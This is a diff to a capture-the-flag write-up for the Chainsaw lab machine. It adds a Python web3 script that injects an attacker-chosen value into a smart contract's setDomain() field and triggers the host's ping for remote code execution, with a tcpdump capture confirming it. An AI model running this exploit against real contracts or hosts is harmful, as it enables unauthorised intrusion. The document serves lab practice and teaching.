@@ -93,25 +93,31 @@ To interact with the Ethereum blockchain, i will be using python library web3.py
 To test this vulnerability we can use setDomain() function and set the domain to our localhost  and then call getDomain(). This will make the contract ping localhost, if ping successful we know we got remote code execution.
 
 ###### Building Python Script
-To test our theory So let’s start building a python script to interact with this contract.
-```python
-
-from web3 import Web3
-import json
-```
-+ web3.Web3 intract with the blockchain
-+ json to load the WeaponizedPing.json
-
-
+To test our theory So let’s start building a python script to interact with this contract. I will using web3 liabrary to interect with smart contract.
 
 My final exploit is shown below
 
+```python
+#!/usr/bin/env python3
+import json, sys
+from web3 import Web3, HTTPProvider
+
+abi = json.loads(open('WeaponizedPing.json').read())
+address = open('address.txt').read().rstrip()
+w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
+account = w3.eth.coinbase
+contract = w3.eth.contract(address=address, abi=abi['abi'])
+contract.functions.setDomain(sys.argv[1]).transact({"from":account,"to":address})
+contract.functions.getDomain().call()
+```
+
+
 #### Initial Shell
 
-Now that we know we can do RCE, lets replace the ping with our payload.
-
+Testing for remote code execution.
 
 Capturing packets:
+
 ```python
 
 ➜  chainsaw tcpdump -i tun0 icmp -n
@@ -120,6 +126,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
 14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
 ```
+Now that we know we can do RCE, lets replace the ping with our payload.
 
 ###### Running the exploit
 
